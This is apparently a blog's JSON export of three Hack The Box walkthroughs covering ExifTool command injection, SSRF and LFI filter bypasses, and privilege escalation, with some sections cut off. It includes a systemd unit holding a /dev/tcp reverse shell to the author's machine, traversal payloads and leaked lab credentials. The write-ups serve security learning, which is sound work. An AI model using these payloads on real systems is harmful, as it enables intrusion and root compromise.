[{"categories":null,"content":"Introduction For this machine, we identify a web app using ExifTool to show metadata for images uploaded via a form. Knowing the version of ExifTool used contains a CVE, we are able to command inject into the form and base64 encode/decode an obfuscated reverse shell to gain a foothold. From here, we find an email containing an event viewer log we must search through. We uncover a credential leak where a failed logon attempt shows the user accidentally entered their username in the password field, giving us credentials to SSH into the machine as a real user. Next, sudo indicates a 64-bit ELF binary we are able to run as root. After copying and disassembling this binary in order to understand its behaviour, we are able to exploit that behaviour to spawn a root shell on the target and get the root flag. ","date":"2023-04-22","objectID":"/2023-04-22-investigation-htb/:1:0","tags":["htb","security","penetration testing","forensics","reversing","injection","disassembly"],"title":"Investigation HTB Walkthrough","uri":"/2023-04-22-investigation-htb/"},{"categories":null,"content":"Enumeration Let’s start with an nmap scan: $nmap -sC -sV -o nmap/initial 10.10.11.197 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 20:09 AEDT Nmap scan report for 10.10.11.197 Host is up (0.020s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA) | 256 274520add2faa73a8373d97c79abf30b (ECDSA) |_ 256 4245eb916e21020617b2748bc5834fe0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-title: Did not follow redirect to http://eforenzics.htb/ |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds We add 10.10.11.197 eforenzics.htb to our /etc/hosts and get the following page when browsing to this domain: Clicking ‘Go!’ takes us to an upload form: The obvious thing to do is upload this photo of a black cat (..obviously.. what else?), and capture the request in Burp Suite (binary content removed because space..): The captured request: POST /upload.php HTTP/1.1 Host: eforenzics.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://eforenzics.htb/service.html Content-Type: multipart/form-data; boundary=---------------------------351195817916335259373921502099 Content-Length: 164057 Origin: http://eforenzics.htb DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------351195817916335259373921502099 Content-Disposition: form-data; name=\"image\"; filename=\"black_cat.jpg\" Content-Type: image/jpeg ÿØÿà\u0000\u0010JFIF\u0000\u0001\u0001\u0001\u0001quests: 1 We are taken to a page with a hyperlink to download a report on our analysed file: We click the here link shown above: GET /analysed_images/blackcatjpg.txt HTTP/1.1 Host: eforenzics.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://eforenzics.htb/upload.php DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 This file response contains: ExifTool Version Number : 12.37 File Name : black_cat.jpg Directory : . File Size : 160 KiB File Modification Date/Time : 2023:02:10 09:14:44+00:00 File Access Date/Time : 2023:02:10 09:14:44+00:00 File Inode Change Date/Time : 2023:02:10 09:14:44+00:00 File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Resolution Unit : inches X Resolution : 300 Y Resolution : 300 Image Width : 800 Image Height : 533 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1) Image Size : 800x533 Megapixels : 0.426 So, the app likelly shells out to ExifTool, which is a perl-based library and command line app for reading, writing and editing meta information across image formats. To speed things up and avoid binary noise of a larger file, let’s resize our black cat image to an ultra ultra high definition resolution of 16x10: $convert black_cat.jpg -resize 16x10 black_cat_sm.jpg Searching for ExifTool 12.37, the first thing I came across was CVE-2022-23935, a command injection vulnerability. Reading a little more thoroughly to try and understand the CVE, the problematic line in ExifTool appears to be: $mode = ($file =~ /\\|$/ ? '' : '\u003c') unless $mode; # snip return open $fh, \"$mode$file\"; This will, using regex, check if the filename ends in a pipe (|). Under normal circumstances, this would not be the case, so we would open a file descriptor with \u003c ","date":"2023-04-22","objectID":"/2023-04-22-investigation-htb/:2:0","tags":["htb","security","penetration testing","forensics","reversing","injection","disassembly"],"title":"Investigation HTB Walkthrough","uri":"/2023-04-22-investigation-htb/"},{"categories":null,"content":"Conclusion An enjoyable machine combining a little forensics along with reverse engineering an ELF binary in order to understand and use its behaviour to privilege escalate to root. Finding the password incorrectly entered in the user field (resulting in a credential leak) took considerable time, as here I was searching for known usernames in the username field, and not other strings. Basically, I should have looked for the absence of known/meaningful usernames and instead looked for anomalies – this meant searching was a little laborious and very much finding a needle in a haystack. This was my first ‘real’ attempt at forensics, and I’m sure I have a lot to learn on the topic. Reversing the binary was fun, if only to practice my skills at understanding how a C app compiles into assembly and subsequently machine code. When in the mood, I actually find assembly moderately easy to understand despite first appearances. I think if you understand a few instructions, and how a call stack is established, pointer references and a few basic concepts plus how they differ between 32-bit and 64-bit, the rest flows naturally and isn’t too difficult to learn on the fly. I’ve been following LiveOverflow’s BinaryExploitation series and pwn.college (both highly recommended!) to prep myself for binary exploitation – and this helped quite a lot. I’m definitely looking forward to diving into more CTFs centered around reversing and binary exploitation very shortly. ","date":"2023-04-22","objectID":"/2023-04-22-investigation-htb/:3:0","tags":["htb","security","penetration testing","forensics","reversing","injection","disassembly"],"title":"Investigation HTB Walkthrough","uri":"/2023-04-22-investigation-htb/"},{"categories":null,"content":"Introduction Another exploitable PHP web app that focuses on character conversions. We leverage Local File Inclusion (LFI) to further enumerate the system by looking at Apache config files and PHP source. With some sleuthing, we find work-in-progress code in a git repository – finding the path to a vulnerable looking PHP script. Knowing this path is only accessible to localhost, we trace back through an existing LFI and use domain confusion in order to perform Server Side Request Forgery. With this, we can execute the vulnerable looking PHP script. From here, we inject a PHP filter chain into the page query parameter, which allows us to leverage LFI to include and execute arbitrary PHP code thanks to encoding conversions prepending controllable characters – setting up a reverse shell. We privilege escalate to a service account by creating a reverse shell we execute as a git filter. Next, we privilege escalate to root by creating and restarting a systemd unit which spawns a root shell. ","date":"2023-04-15","objectID":"/2023-04-15-encoding-htb/:1:0","tags":["htb","security","penetration testing","ctf","php","filter","lfi","ssrf","git","lfi2rce"],"title":"Encoding HTB Walkthrough","uri":"/2023-04-15-encoding-htb/"},{"categories":null,"content":"Enumeration As usual, we start enumerating running services by port scanning with nmap, -sC for default scripts and -sV to enable version detection: $nmap -sC -sV -o nmap/initial 10.10.11.198 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 19:20 AEST Nmap scan report for 10.10.11.198 Host is up (0.020s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: HaxTables Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds Browse to the found web server on http://10.10.11.198/: In the Convertions (sic) menu, we can select from String, Integer, Numbers. This presents a form like so: The API page gives us useful information on the available API calls we can make when hitting http://api.haxtables.htb/ programmatically: On the string conversions page, we select Base64 encode, enter a string and click Submit – while intercepting the request in BurpSuite: POST /handler.php HTTP/1.1 Host: 10.10.11.198 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.11.198/index.php?page=string Content-Type: application/json;charset=UTF-8 Content-Length: 73 Origin: http://10.10.11.198 DNT: 1 Connection: close {\"action\":\"b64encode\",\"data\":\"hello world\",\"uri_path\":\"/v3/tools/string\"} HTTP/1.1 200 OK Date: Mon, 03 Apr 2023 09:29:07 GMT Server: Apache/2.4.52 (Ubuntu) Vary: Accept-Encoding Content-Length: 27 Connection: close Content-Type: text/html; charset=UTF-8 {\"data\":\"aGVsbG8gd29ybGQ=\"} Here, I decided to add 10.10.11.198 haxtables.htb api.haxtables.htb to my /etc/hosts Fuzzing the main host with raft medium from SecLists, a common wordlist for web directories: $ffuf -u \"http://haxtables.htb/FUZZ\" -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://haxtables.htb/FUZZ :: Wordlist : FUZZ: /home/zara/SecLists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ includes [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 27ms] assets [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 20ms] server-status [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 21ms] [Status: 200, Size: 1999, Words: 246, Lines: 49, Duration: 38ms] Fuzzing api.haxtables.htb with the same wordlist: $ffuf -u \"http://api.haxtables.htb/FUZZ\" -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://api.haxtables.htb/FUZZ :: Wordlist : FUZZ: /home/zara/SecLists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ v2 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 20ms] v3 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 19ms] v1 [Status: 301","date":"2023-04-15","objectID":"/2023-04-15-encoding-htb/:2:0","tags":["htb","security","penetration testing","ctf","php","filter","lfi","ssrf","git","lfi2rce"],"title":"Encoding HTB Walkthrough","uri":"/2023-04-15-encoding-htb/"},{"categories":null,"content":"Foothold The /handler.php script appears to be a wrapper around the API called from the web interface and we can specify the underlying API to use via the uri_path, which we can control (first red flag!). I tried some payloads with a modified uri_path similar to the following: POST /handler.php HTTP/1.1 Host: 10.10.11.198 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.11.198/index.php?page=string Content-Type: application/json;charset=UTF-8 Content-Length: 78 Origin: http://10.10.11.198 DNT: 1 Connection: close {\"action\":\"b64encode\",\"data\":\"hello world!!!\",\"uri_path\":\"handler.php\"} Each time, the server would hang for 5-10 seconds, before giving an empty HTTP 200 response. Hitting the URL directly, trying to encode localhost: $curl -X POST \"http://api.haxtables.htb/v3/tools/string/index.php\" -H \"Content-Type: application/json\" -d '{\"action\": \"b64encode\", \"file_url\": \"http://127.0.0.1\"}' {\"message\":\"Unacceptable URL\"}% So there seems to be some filtering to try and stop us from performing Server Side Request Forgery (SSRF). HackTricks has a list of URL format bypasses: URL Format Bypass - HackTricks , and http://0/ seemed to work: $curl -X POST \"http://api.haxtables.htb/v3/tools/string/index.php\" -H \"Content-Type: application/json\" -d '{\"action\": \"b64encode\", \"file_url\": \"http://0/index.php\"}' {\"data\":\"PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHRpdGxlPkhheFRhYmxlczwvdGl0bGU+DQogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPg0KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC8zLjQuMS9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPg0KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjYuMC9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4NCiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvMy40LjEvanMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJhc3NldHMvY3NzL21haW4uY3NzIj4NCiAgICA8c2NyaXB0IHNyYz0iLi9hc3NldHMvanMvbWFpbi5qcyI+PC9zY3JpcHQ+DQoNCjwvaGVhZD4NCjxib2R5Pg0KPGgxIGFsaWduPSJjZW50ZXIiPkhheFRhYmxlczwvaDE+DQo8YnI+PGJyPg0KPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCjxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItaW52ZXJzZSI+DQogIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+DQogICAgPGRpdiBjbGFzcz0ibmF2YmFyLWhlYWRlciI+DQogICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSIvIj5IYXhUYWJsZXM8L2E+DQogICAgPC9kaXY+DQogICAgPHVsIGNsYXNzPSJuYXYgbmF2YmFyLW5hdiI+DQogICAgICA8bGkgY2xhc3M9ImFjdGl2ZSI+PGEgaHJlZj0iLyI+SG9tZTwvYT48L2xpPg0KICAgICAgPGxpIGNsYXNzPSJkcm9wZG93biI+PGEgY2xhc3M9ImRyb3Bkb3duLXRvZ2dsZSIgZGF0YS10b2dnbGU9ImRyb3Bkb3duIiBocmVmPSIjIj5Db252ZXJ0aW9uczxzcGFuIGNsYXNzPSJjYXJldCI+PC9zcGFuPjwvYT4NCiAgICAgICAgPHVsIGNsYXNzPSJkcm9wZG93bi1tZW51Ij4NCiAgICAgICAgICA8bGk+PGEgaHJlZj0iL2luZGV4LnBocD9wYWdlPXN0cmluZyI+U3RyaW5nPC9hPjwvbGk+DQogICAgICAgICAgPGxpPjxhIGhyZWY9Ii9pbmRleC5waHA\\/cGFnZT1pbnRlZ2VyIj5JbnRlZ2VyPC9hPjwvbGk+DQogICAgICAgICAgPGxpPjxhIGhyZWY9Ii9pbmRleC5waHA\\/cGFnZT1pbWFnZSI+SW1hZ2VzPC9hPjwvbGk+DQogICAgICAgIDwvdWw+DQogICAgICA8L2xpPg0KICAgICAgPGxpPjxhIGhyZWY9IiMiPkFib3V0IHVzPC9hPjwvbGk+DQogICAgICA8bGk+PGEgaHJlZj0iL2luZGV4LnBocD9wYWdlPWFwaSI+QVBJPC9hPjwvbGk+DQogICAgPC91bD4NCiAgPC9kaXY+DQo8L25hdj4NCg0KPHAgYWxpZ249ImNlbnRlciI+RnJlZSBvbmxpbmUgU3RyaW5nIGFuZCBOdW1iZXIgY29udmVydGVyLiBKdXN0IGxvYWQgeW91ciBpbnB1dCAgYW5kIHRoZXkgd2lsbCBhdXRvbWF0aWNhbGx5IGdldCBjb252ZXJ0ZWQgdG8gc2VsZWN0ZWQgZm9ybWF0LiAgQSBjb2xsZWN0aW9uIG9mIHVzZWZ1bCB1dGlsaXRpZXMgZm9yIHdvcmtpbmcgd2l0aCBTdHJpbmcgYW5kIEludGVnZXIgdmFsdWVzLiBBbGwgYXJlIHNpbXBsZSwgZnJlZSBhbmQgZWFzeSB0byB1c2UuIFRoZXJlIGFyZSBubyBhZHMsIHBvcHVwcyBvciBvdGhlciBnYXJiYWdlITwvcD4NCg0KPHAg","date":"2023-04-15","objectID":"/2023-04-15-encoding-htb/:3:0","tags":["htb","security","penetration testing","ctf","php","filter","lfi","ssrf","git","lfi2rce"],"title":"Encoding HTB Walkthrough","uri":"/2023-04-15-encoding-htb/"},{"categories":null,"content":"Privilege Escalation After SSHing in with ssh -i id_rsa svc@haxtables.htb, we see we can run /usr/bin/systemctl restart * as sudo: svc@encoding:~$ sudo -l Matching Defaults entries for svc on encoding: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svc may run the following commands on encoding: (root) NOPASSWD: /usr/bin/systemctl restart * First I tried Wildcards Spare tricks, but systemctl kept escaping my bad input. My next thought was to see if I can create a systemd unit file with a reverse shell, and restart my new service.. Let’s see which directories are writable by this user: svc@encoding:/dev/shm$ find / -writable 2\u003e /dev/null .. snip .. /etc/systemd/user/session-migration.service /etc/systemd/system We create a service called seashell, a reverse shell back to my machine. We copy it into /etc/systemd/system, and restart it: svc@encoding:/dev/shm$ cat seashell.service [Unit] Description=sea shells by thes seashore [Service] RemainAfterExit=yes Type=simple ExecStart=/bin/bash -c \"exec 5\u003c\u003e/dev/tcp/10.10.14.62/3322; cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done\" [Install] WantedBy=default.target svc@encoding:/dev/shm$ cp seashell.service /etc/systemd/system svc@encoding:/dev/shm$ sudo -u root /usr/bin/systemctl restart seashell.service And back in our netcat listener, we now have a root shell, plus the root flag!: $nc -lvnp 3322 Listening on 0.0.0.0 3322 Connection received on 10.10.11.198 53080 id uid=0(root) gid=0(root) groups=0(root) cd /root ls root.txt scripts cat root.txt bfc3a64c2fca504300e71bc354bc9651 Done! ","date":"2023-04-15","objectID":"/2023-04-15-encoding-htb/:4:0","tags":["htb","security","penetration testing","ctf","php","filter","lfi","ssrf","git","lfi2rce"],"title":"Encoding HTB Walkthrough","uri":"/2023-04-15-encoding-htb/"},{"categories":null,"content":"Conclusion I had read about PHP filter chains a little while ago as a means of leveraging LFI to gain Remote Code Execution (LFI2RCE) – and it was quite cool to finally try it out in a somewhat real-worldish setting. I definitely got lost along the way and back tracked a few times – log poisoning led me astray, and working towards SSRF took some time. After this though, the path was fairly obvious, particularly privesc to the service account and root. Any valuable lessons learnt? While going deep is definitely valuable and required, I should consider approaches such as time boxing any ‘bread crumbs’, and making a decision to back track before trying something else – it’s exceptionally easy to get caught up on an attack vector that never actually eventuates at times. I’m not sure of the best tool (logseq whiteboards?), but it would be cool to use a mind mapping app to track progress on CTFs and more easily see the paths tried, dead ends, etc. Speaking of tools, I might try Villain next time around, as a nice session manager for shells and alternative to netcat. After seeing John Hammond demo Villain, and losing track of my open shells, it looks like the perfect tool for managing shell sessions. ","date":"2023-04-15","objectID":"/2023-04-15-encoding-htb/:5:0","tags":["htb","security","penetration testing","ctf","php","filter","lfi","ssrf","git","lfi2rce"],"title":"Encoding HTB Walkthrough","uri":"/2023-04-15-encoding-htb/"},{"categories":null,"content":"Introduction A moderately challenging machine (for me at least) where we use a basic filter bypass to perform Local File Inclusion, allowing us to read a PHP web app’s source code and uncover any insecure code. With this knowledge, we attack a poor attempt at randomness which was a new thing for me in a CTF environment, allowing us to register and activate an account. With login access, we exploit a theme via PHP object injection to get RCE. From here, we can dump and crack credentials from a database connection string we found earlier allowing us to privilege escalate from www-data to a real user. Finally, we then rely on write access to a location where a cron job looks for certificates for renewal – and exploit this script via command injection to get root access. ","date":"2023-04-08","objectID":"/2023-04-08-broscience-htb/:1:0","tags":["htb","security","penetration testing","ctf","php","deserialization","injection"],"title":"BroScience HTB Walkthrough","uri":"/2023-04-08-broscience-htb/"},{"categories":null,"content":"Enumeration We start with an nmap scan to find running and accessible services: $nmap -sC -sV -o nmap/initial 10.10.11.195 Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 18:27 AEDT Nmap scan report for 10.10.11.195 Host is up (0.90s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA) | 256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA) |_ 256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519) 80/tcp open http Apache httpd 2.4.54 |_http-title: Did not follow redirect to https://broscience.htb/ |_http-server-header: Apache/2.4.54 (Debian) 443/tcp open ssl/http Apache httpd 2.4.54 ((Debian)) | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.54 (Debian) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT | Not valid before: 2022-07-14T19:48:36 |_Not valid after: 2023-07-14T19:48:36 |_http-title: BroScience : Home |_ssl-date: TLS randomness does not represent time Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.93 seconds We add broscience.htb into our /etc/hosts and browse there to follow the redirect. We’re greeted with – well, a blog about bros.. and science.. and bro science, where each URL is for a particular exercise of the format https://broscience.htb/exercise.php?id=11 Attempting to leave a comment redirects me to a login page. URLs show us this is a PHP app, and we’re on Apache/2.4.54 based on response headers. Our login page is shown below: Gobuster scan to enumerate the web server: $gobuster dir -u https://broscience.htb/ -w /usr/share/dirb/wordlists/big.txt -k =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://broscience.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/01/28 18:44:14 Starting gobuster in directory enumeration mode =============================================================== /.htaccess (Status: 403) [Size: 280] /.htpasswd (Status: 403) [Size: 280] /images (Status: 301) [Size: 319] [--\u003e https://broscience.htb/images/] /includes (Status: 301) [Size: 321] [--\u003e https://broscience.htb/includes/] /javascript (Status: 301) [Size: 323] [--\u003e https://broscience.htb/javascript/] /manual (Status: 301) [Size: 319] [--\u003e https://broscience.htb/manual/] /server-status (Status: 403) [Size: 280] /styles (Status: 301) [Size: 319] [--\u003e https://broscience.htb/styles/] =============================================================== 2023/01/28 18:45:03 Finished =============================================================== ","date":"2023-04-08","objectID":"/2023-04-08-broscience-htb/:2:0","tags":["htb","security","penetration testing","ctf","php","deserialization","injection"],"title":"BroScience HTB Walkthrough","uri":"/2023-04-08-broscience-htb/"},{"categories":null,"content":"Foothold We can see directory listings, and within https://broscience.htb/includes/ , there is an img.php. Navigating to https://broscience.htb/includes/img.php shows a “missing path” error, and attempting path traversal on the path query parameter shows “attack detected”. I wondered if this was a clue, and if we could URL encode or otherwise encode the path value to bypass this filter, perhaps? At this point, I started searching for directory traversal filter bypassing and came across Advanced Directory Traversal filter bypassing. I tried a few techniques, including encoding dots, and at best would receive a 200 response wth an empty body. In addition, some strings such as ‘passwd’ will trigger the above error message. Back tracking slightly to gather more data, each exercise is posted by a user id and clicking on a username will load URL https://broscience.htb/user.php?id=X I am able to enumerate from id 1 to 5, which gives me the following users with attributes – which may be useful later on?: administrator Member since 4 years ago Email Address administrator@broscience.htb Total exercises posted 138 Total comments posted 46 Is activated Yes Is admin Yes bill Member since 4 years ago Email Address bill@broscience.htb Total exercises posted 92 Total comments posted 46 Is activated Yes Is admin No michael Member since 2 years ago Email Address michael@broscience.htb Total exercises posted 92 Total comments posted 46 Is activated Yes Is admin No john Member since 1 year ago Email Address john@broscience.htb Total exercises posted 46 Total comments posted 138 Is activated Yes Is admin No dmytro Member since 1 year ago Email Address dmytro@broscience.htb Total exercises posted 0 Total comments posted 0 Is activated Yes Is admin No Looking back, I decided to try the filter bypass on a known working file - images/bench.png – the below actually works, and gives me the image file as per those files in https://broscience.htb/images – so double URL encoding a forward slash works as a filter bypass: GET /includes/img.php?path=..%252Fimages%252Fbench.png HTTP/1.1 Host: broscience.htb Cookie: PHPSESSID=7tgk1lrrj4m6p5218rvb9i0t69 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Dnt: 1 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Te: trailers Connection: close As mentioned, our gobuster output shows /includes , which contains: db_connect.php sounds interesting.. can we do a LFI (Local File Inclusion) and fetch it with GET /includes/img.php?path=..%252Fincludes%252Fdb_connect.php HTTP/1.1 ? Yep!: HTTP/1.1 200 OK Date: Sat, 28 Jan 2023 08:59:25 GMT Server: Apache/2.4.54 (Debian) Content-Length: 337 Connection: close Content-Type: image/png \u003c?php $db_host = \"localhost\"; $db_port = \"5432\"; $db_name = \"broscience\"; $db_user = \"dbuser\"; $db_pass = \"RangeOfMotion%777\"; $db_salt = \"NaCl\"; $db_conn = pg_connect(\"host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}\"); if (!$db_conn) { die(\"\u003cb\u003eError\u003c/b\u003e: Unable to connect to database\"); } ?\u003e header.php isn’t particularly interesting, but for GET /includes/img.php?path=..%252Fincludes%252Fimg.php HTTP/1.1 we get: HTTP/1.1 200 OK Date: Sat, 28 Jan 2023 09:01:58 GMT Server: Apache/2.4.54 (Debian) Content-Length: 483 Connection: close Content-Type: image/png \u003c?php if (!isset($_GET['path'])) { die('\u003cb\u003eError:\u003c/b\u003e Missing \\'path\\' parameter.'); } // Check for LFI attacks $path = $_GET['path']; $badwords = array(\"../\", \"etc/passwd\", \".ssh\"); foreach ($badwords as $badword) { if (strpos($path, $badword) !== false) { die('\u003cb\u003eError:\u003c/b\u003e Attack detected.'); } } // Normalize path $path = urldecode($path); // Return the image header('Content-Type: image/png'); echo file_get_contents('/var/www/html/images/' . $path); ?\u003e So t","date":"2023-04-08","objectID":"/2023-04-08-broscience-htb/:3:0","tags":["htb","security","penetration testing","ctf","php","deserialization","injection"],"title":"BroScience HTB Walkthrough","uri":"/2023-04-08-broscience-htb/"},{"categories":null,"content":"Privilege Escalation Initially, I tried: looking for setuid binaries checking the shell environment running LinPEAS browsing the file system /opt/renew_cert.sh was the only thing that stood out as unusual I finally ran pspy64 -r /tmp to monitor /tmp , as the above script writes a new SSL certificate here. Here is the full script: #!/bin/bash if [ \"$#\" -ne 1 ] || [ $1 == \"-h\" ] || [ $1 == \"--help\" ] || [ $1 == \"help\" ]; then echo \"Usage: $0 certificate.crt\"; exit 0; fi if [ -f $1 ]; then openssl x509 -in $1 -noout -checkend 86400 \u003e /dev/null if [ $? -eq 0 ]; then echo \"No need to renew yet.\"; exit 1; fi subject=$(openssl x509 -in $1 -noout -subject | cut -d \"=\" -f2-) country=$(echo $subject | grep -Eo 'C = .{2}') state=$(echo $subject | grep -Eo 'ST = .*,') locality=$(echo $subject | grep -Eo 'L = .*,') organization=$(echo $subject | grep -Eo 'O = .*,') organizationUnit=$(echo $subject | grep -Eo 'OU = .*,') commonName=$(echo $subject | grep -Eo 'CN = .*,?') emailAddress=$(openssl x509 -in $1 -noout -email) country=${country:4} state=$(echo ${state:5} | awk -F, '{print $1}') locality=$(echo ${locality:3} | awk -F, '{print $1}') organization=$(echo ${organization:4} | awk -F, '{print $1}') organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}') commonName=$(echo ${commonName:5} | awk -F, '{print $1}') echo $subject; echo \"\"; echo \"Country =\u003e $country\"; echo \"State =\u003e $state\"; echo \"Locality =\u003e $locality\"; echo \"Org Name =\u003e $organization\"; echo \"Org Unit =\u003e $organizationUnit\"; echo \"Common Name =\u003e $commonName\"; echo \"Email =\u003e $emailAddress\"; echo -e \"\\nGenerating certificate...\"; openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt 